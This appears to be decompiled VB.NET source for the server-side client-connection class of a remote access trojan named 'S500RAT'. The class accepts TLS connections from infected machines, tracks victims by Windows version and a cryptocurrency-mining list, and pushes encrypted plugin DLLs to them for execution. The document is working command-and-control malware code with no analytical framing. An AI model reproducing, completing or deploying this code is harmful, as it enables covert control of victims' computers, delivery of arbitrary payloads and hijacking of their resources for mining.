Imports System
Imports System.IO
Imports System.Net.Security
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Security.Authentication
Imports System.Security.Cryptography
Imports System.Text
Imports System.Threading
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Algorithm
Imports Sunny.UI

Namespace S500RAT.Server.Connection
	' Token: 0x0200000B RID: 11
	Public Class Clients
		' Token: 0x06000058 RID: 88 RVA: 0x00002EE0 File Offset: 0x000010E0
		Public Sub New(socket As Socket)
			Me.Folder = Application.StartupPath + "\"
			Me.string_0 = String.Empty
			Me.SendSync = RuntimeHelpers.GetObjectValue(New Object())
			Me.TcpClient = socket
			Me.IP = Me.TcpClient.RemoteEndPoint.ToString().Split(New Char() { ":"c })(0)
			Me.Listener1 = Me.Listener1
			Me.SslClient = New SslStream(New NetworkStream(Me.TcpClient, True), False)
			Me.SslClient.BeginAuthenticateAsServer(Setting.ServerCertificate, False, SslProtocols.Tls, False, AddressOf Me.EndAuthenticate, Nothing)
		End Sub

		' Token: 0x06000059 RID: 89 RVA: 0x00002FA0 File Offset: 0x000011A0
		Public Function IpPort() As String
			Dim flag As Boolean = Me.string_0.Length <= 0
			If flag Then
				Try
					Me.string_0 = Me.TcpClient.RemoteEndPoint.ToString()
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
			Return Me.string_0
		End Function

		' Token: 0x0600005A RID: 90 RVA: 0x00003014 File Offset: 0x00001214
		Public Sub EndAuthenticate(ar As IAsyncResult)
			' The following expression was wrapped in a checked-statement
			Try
				Me.SslClient.EndAuthenticateAsServer(ar)
				Me.Offset = 0L
				Me.HeaderSize = 4L
				Me.ClientBuffer = New Byte(CInt((Me.HeaderSize - 1L)) + 1 - 1) {}
				Me.SslClient.BeginRead(Me.ClientBuffer, CInt(Me.Offset), CInt(Me.HeaderSize), AddressOf Me.ReadClientData, Nothing)
			Catch ex As Exception
				Dim sslClient As SslStream = Me.SslClient
				Dim flag As Boolean = sslClient IsNot Nothing
				If flag Then
					sslClient.Dispose()
				End If
				Dim tcpClient As Socket = Me.TcpClient
				Dim flag2 As Boolean = tcpClient IsNot Nothing
				If flag2 Then
					tcpClient.Dispose()
				End If
			End Try
		End Sub

		' Token: 0x0600005B RID: 91 RVA: 0x000030D4 File Offset: 0x000012D4
		Public Sub ReadClientData(ar As IAsyncResult)
			' The following expression was wrapped in a checked-statement
			Try
				Dim flag As Boolean = Not Me.TcpClient.Connected
				If flag Then
					Me.Disconnected()
				Else
					Dim num As Integer = Me.SslClient.EndRead(ar)
					Dim flag2 As Boolean = num > 0
					If flag2 Then
						Dim ptr As Long = Me.HeaderSize
						Me.HeaderSize = ptr - CLng(num)
						ptr = Me.Offset
						Me.Offset = ptr + CLng(num)
						Dim flag3 As Boolean = Not Me.ClientBufferRecevied
						If flag3 Then
							Dim flag4 As Boolean = Me.HeaderSize = 0L
							If flag4 Then
								' The following expression was wrapped in a unchecked-expression
								Me.HeaderSize = CLng(BitConverter.ToInt32(Me.ClientBuffer, 0))
								Dim flag5 As Boolean = Me.HeaderSize > 0L
								If flag5 Then
									Me.ClientBuffer = New Byte(CInt((Me.HeaderSize - 1L)) + 1 - 1) {}
									Me.Offset = 0L
									Me.ClientBufferRecevied = True
								End If
							Else
								Dim flag6 As Boolean = Me.HeaderSize < 0L
								If flag6 Then
									Me.Disconnected()
									Return
								End If
							End If
						Else
							Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Setting.LockReceivedSendValue)
							Dim obj As Object = objectValue
							ObjectFlowControl.CheckForSyncLockOnValueType(obj)
							SyncLock obj
								' The following expression was wrapped in a unchecked-expression
								Setting.ReceivedValue += CLng(num)
							End SyncLock
							ptr = Me.BytesRecevied
							Me.BytesRecevied = ptr + CLng(num)
							Dim flag8 As Boolean = Me.HeaderSize = 0L
							If flag8 Then
								Dim $VB$NonLocal_2 As DataB = New DataB() With { .client_0 = Me, .data = Me.ClientBuffer }
								ThreadPool.QueueUserWorkItem(Sub(a0 As Object)
									$VB$NonLocal_2.Read()
								End Sub, Nothing)
								Me.Offset = 0L
								Me.HeaderSize = 4L
								Me.ClientBuffer = New Byte(CInt((Me.HeaderSize - 1L)) + 1 - 1) {}
								Me.ClientBufferRecevied = False
							Else
								Dim flag9 As Boolean = Me.HeaderSize < 0L
								If flag9 Then
									Me.Disconnected()
									Return
								End If
							End If
						End If
						Me.SslClient.BeginRead(Me.ClientBuffer, CInt(Me.Offset), CInt(Me.HeaderSize), AddressOf Me.ReadClientData, Nothing)
					Else
						Me.Disconnected()
					End If
				End If
			Catch ex As Exception
				Me.Disconnected()
			End Try
		End Sub

		' Token: 0x0600005C RID: 92 RVA: 0x00003338 File Offset: 0x00001538
		Public Sub Disconnected()
			Dim flag As Boolean = Me.L IsNot Nothing
			If flag Then
				' The following expression was wrapped in a checked-expression
				DataB.form1_0.Invoke(New MethodInvoker(Sub()
					Dim lockDataGridViewClients As Object = Setting.LockDataGridViewClients
					ObjectFlowControl.CheckForSyncLockOnValueType(lockDataGridViewClients)
					SyncLock lockDataGridViewClients
						Try
							Me.L.Cells(14).Value = "Disconnected"
							DataB.form1_0.L1Home.Rows.Add(New Object() { Me.L.Cells(7).Value, Me.L.Cells(8).Value, Me.L.Cells(2).Value, Me.L.Cells(4).Value, Me.L.Cells(10).Value, Me.L.Cells(12).Value, DataB.form1_0.WinList.Images("Disconnect.png") })
							ListLogs.AddArray(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("Client ", Me.L.Cells(2).Value), " \ "), Me.L.Cells(3).Value), " \ "), Me.L.Cells(10).Value), "  Disconnected")), 5)
						Catch value As Exception
							Console.WriteLine(value)
						End Try
						Try
							Dim text As String = Conversions.ToString(Me.L.Cells(10).Value)
							Dim flag3 As Boolean = text.Contains("7")
							If flag3 Then
								Dim numWizndowsXpAnd As UILabel = DataB.form1_0.NumWizndowsXpAnd7
								Dim uilabel As UILabel = numWizndowsXpAnd
								numWizndowsXpAnd.Text = Conversions.ToString(Conversions.ToDouble(uilabel.Text) - 1.0)
								DataB.form1_0.ProgressBarWizndowsXPAnd7.Maximum = DataB.form1_0.L1.Rows.Count - 1
								DataB.form1_0.ProgressBarWizndowsXPAnd7.Value = Conversions.ToInteger(DataB.form1_0.NumWizndowsXpAnd7.Text)
							Else
								Dim flag4 As Boolean = text.Contains("Windows 8")
								If flag4 Then
									Dim numWizndows As UILabel = DataB.form1_0.NumWizndows8
									Dim uilabel As UILabel = numWizndows
									numWizndows.Text = Conversions.ToString(Conversions.ToDouble(uilabel.Text) - 1.0)
									DataB.form1_0.ProgressBarWizndows8.Maximum = DataB.form1_0.L1.Rows.Count - 1
									DataB.form1_0.ProgressBarWizndows8.Value = Conversions.ToInteger(DataB.form1_0.NumWizndows8.Text)
								Else
									Dim flag5 As Boolean = text.Contains("10")
									If flag5 Then
										Dim numWzindows As UILabel = DataB.form1_0.NumWzindows10
										Dim uilabel As UILabel = numWzindows
										numWzindows.Text = Conversions.ToString(Conversions.ToDouble(uilabel.Text) - 1.0)
										DataB.form1_0.ProgressBarWizndows10.Maximum = DataB.form1_0.L1.Rows.Count - 1
										DataB.form1_0.ProgressBarWizndows10.Value = Conversions.ToInteger(DataB.form1_0.NumWzindows10.Text)
									Else
										Dim flag6 As Boolean = text.Contains("11")
										If flag6 Then
											Dim numWizndows2 As UILabel = DataB.form1_0.NumWizndows11
											Dim uilabel As UILabel = numWizndows2
											numWizndows2.Text = Conversions.ToString(Conversions.ToDouble(uilabel.Text) - 1.0)
											DataB.form1_0.ProgressBarWizndows11.Maximum = DataB.form1_0.L1.Rows.Count - 1
											DataB.form1_0.ProgressBarWizndows11.Value = Conversions.ToInteger(DataB.form1_0.NumWizndows11.Text)
										End If
									End If
								End If
							End If
							DataB.form1_0.NumAllSystem.Text = Conversions.ToString(DataB.form1_0.L1.Rows.Count - 1)
						Catch value2 As Exception
							Console.WriteLine(value2)
						End Try
						Try
							Clients.notff.NotifClient(Conversions.ToString(Me.L.Cells(2).Value), Conversions.ToString(Me.L.Cells(4).Value), Conversions.ToString(Me.L.Cells(10).Value), Conversions.ToString(Me.L.Cells(8).Value), False)
						Catch ex As Exception
						End Try
						Try
							DataB.form1_0.L1.Rows.Remove(Me.L)
							Me.L = Nothing
							DataB.OutOnlien += 1
							DataB.form1_0.numOutOnlien.Text = "-" + Conversions.ToString(DataB.OutOnlien)
						Catch ex2 As Exception
							ListLogs.AddArray("Disconnected! : An unexpected error occurred!", 0)
						End Try
						Try
							DataB.form1_0.MiningL1.Rows.Remove(Me.MiningDatagridview)
							Me.MiningDatagridview = Nothing
							DataB.form1_0.NumListMining.Text = Conversions.ToString(DataB.form1_0.MiningL1.Rows.Count) + "+"
						Catch ex3 As Exception
						End Try
					End SyncLock
				End Sub))
			End If
			Try
				Dim sslClient As SslStream = Me.SslClient
				If sslClient IsNot Nothing Then
					sslClient.Dispose()
				End If
				Dim tcpClient As Socket = Me.TcpClient
				If tcpClient IsNot Nothing Then
					tcpClient.Dispose()
				End If
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600005D RID: 93 RVA: 0x000033B4 File Offset: 0x000015B4
		Public Sub SendString(str As String)
			Try
				Me.SendByte(Functions.Get_Byte(str))
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x0600005E RID: 94 RVA: 0x000033F4 File Offset: 0x000015F4
		Public Sub SendByte(msg As Object)
			Dim objectValue As Object = RuntimeHelpers.GetObjectValue(Me.SendSync)
			Dim obj As Object = objectValue
			ObjectFlowControl.CheckForSyncLockOnValueType(obj)
			SyncLock obj
				Try
					Dim flag2 As Boolean = Not Me.TcpClient.Connected
					If flag2 Then
						Me.Disconnected()
					Else
						Dim flag3 As Boolean = CType(msg, Byte()) IsNot Nothing
						If flag3 Then
							Dim array As Byte() = CType(msg, Byte())
							Dim bytes As Byte() = BitConverter.GetBytes(array.Length)
							Me.TcpClient.Poll(-1, SelectMode.SelectWrite)
							Me.SslClient.Write(bytes, 0, bytes.Length)
							Dim flag4 As Boolean = array.Length > 1000000
							Dim objectValue2 As Object
							If flag4 Then
								Using memoryStream As MemoryStream = New MemoryStream(array)
									memoryStream.Position = 0L
									Dim array2 As Byte() = New Byte(49999) {}
									While True
										Dim num As Integer = memoryStream.Read(array2, 0, array2.Length)
										Dim num2 As Integer = num
										Dim flag5 As Boolean = num <= 0
										If flag5 Then
											Exit For
										End If
										Me.TcpClient.Poll(-1, SelectMode.SelectWrite)
										Me.SslClient.Write(array2, 0, num2)
										Me.SslClient.Flush()
										objectValue2 = RuntimeHelpers.GetObjectValue(Setting.LockReceivedSendValue)
										Dim obj2 As Object = objectValue2
										ObjectFlowControl.CheckForSyncLockOnValueType(obj2)
										SyncLock obj2
											' The following expression was wrapped in a unchecked-expression
											Setting.SentValue += CLng(num2)
										End SyncLock
									End While
									GoTo IL_1E7
								End Using
							End If
							Me.TcpClient.Poll(-1, SelectMode.SelectWrite)
							Me.SslClient.Write(array, 0, array.Length)
							Me.SslClient.Flush()
							objectValue2 = RuntimeHelpers.GetObjectValue(Setting.LockReceivedSendValue)
							Dim obj3 As Object = objectValue2
							ObjectFlowControl.CheckForSyncLockOnValueType(obj3)
							SyncLock obj3
								' The following expression was wrapped in a unchecked-expression
								Setting.SentValue += CLng(array.Length)
							End SyncLock
							IL_1E7:
						End If
					End If
				Catch ex As Exception
					Me.Disconnected()
				End Try
			End SyncLock
		End Sub

		' Token: 0x0600005F RID: 95 RVA: 0x0000368C File Offset: 0x0000188C
		Public Function GetPluginHash(FileName As String) As String
			Dim result As String = ""
			Try
				Dim flag As Boolean = File.Exists("Plugins\" + FileName + ".dll")
				If flag Then
					Using fileStream As FileStream = File.OpenRead("Plugins\" + FileName + ".dll")
						Dim sha256Managed As SHA256Managed = New SHA256Managed()
						Dim value As Byte() = sha256Managed.ComputeHash(fileStream)
						result = BitConverter.ToString(value).Replace("-", String.Empty)
					End Using
				Else
					ListLogs.AddArray(String.Concat(New String() { "Clent ", Me.IP, " Error : ", FileName, " library not found!!" }), 0)
				End If
			Catch ex As Exception
				ListLogs.AddArray("Clent " + Me.IP + " Error : " + ex.Message, 0)
			End Try
			Return result
		End Function

		' Token: 0x06000060 RID: 96 RVA: 0x0000379C File Offset: 0x0000199C
		Public Function DecryptByte(B As Byte()) As Byte()
			Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)))
			Dim result As Byte()
			If flag Then
				result = New Byte(0) {}
			Else
				Dim flag2 As Boolean = Operators.CompareString(Setting.Clienttext, Nothing, False) = 0
				If flag2 Then
					result = New Byte(0) {}
				Else
					Dim array As Byte() = CType(NewLateBinding.LateGet(Encoding.UTF8, Nothing, "GetBytes", New Object() { FormSC.GetPassClient() }, Nothing, Nothing, Nothing), Byte())
					array = SHA256.Create().ComputeHash(array)
					Dim array2 As Byte() = Functions.AES_Decrypt(B, array)
					result = array2
				End If
			End If
			Return result
		End Function

		' Token: 0x06000061 RID: 97 RVA: 0x0000383C File Offset: 0x00001A3C
		Public Sub SendPlugin(hash As String, Argse As String, check As Boolean)
			Try
				For Each text As String In Directory.GetFiles("Plugins", "*.dll", SearchOption.TopDirectoryOnly)
					Dim flag As Boolean = Operators.CompareString(hash, GetHash.GetChecksum(text), False) = 0
					If flag Then
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").SetAsString("SavePLG")
						msgPack.ForcePathObject("Dll").SetAsBytes(Zip.Compress(Me.DecryptByte(File.ReadAllBytes(text))))
						msgPack.ForcePathObject("Hash").SetAsString(GetHash.GetChecksum(text))
						msgPack.ForcePathObject("Argse").SetAsString(Argse)
						msgPack.ForcePathObject("Check").SetAsString(Conversions.ToString(check))
						ThreadPool.QueueUserWorkItem(AddressOf Me.SendByte, msgPack.Encode2Bytes())
						ListLogs.AddArray("Plugin " + Path.GetFileName(text) + " Sent to client " + Me.IP, 3)
						Exit For
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Clent " + Me.IP + " Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x0400000B RID: 11
		Private Shared notff As HelpNotif = New HelpNotif()

		' Token: 0x0400000C RID: 12
		Public Folder As String

		' Token: 0x0400000D RID: 13
		Private string_0 As String

		' Token: 0x0400000E RID: 14
		Public Listener1 As Listener

		' Token: 0x0400000F RID: 15
		Public TcpClient As Socket

		' Token: 0x04000010 RID: 16
		Public SslClient As SslStream

		' Token: 0x04000011 RID: 17
		Public L As DataGridViewRow

		' Token: 0x04000012 RID: 18
		Public MiningDatagridview As DataGridViewRow

		' Token: 0x04000013 RID: 19
		Private ClientBuffer As Byte()

		' Token: 0x04000014 RID: 20
		Private HeaderSize As Long

		' Token: 0x04000015 RID: 21
		Private Offset As Long

		' Token: 0x04000016 RID: 22
		Private ClientBufferRecevied As Boolean

		' Token: 0x04000017 RID: 23
		Public SendSync As Object

		' Token: 0x04000018 RID: 24
		Public BytesRecevied As Long

		' Token: 0x04000019 RID: 25
		Public IpAndCountry As String()

		' Token: 0x0400001A RID: 26
		Public IP As String

		' Token: 0x0400001B RID: 27
		Public ID As String
	End Class
End Namespace
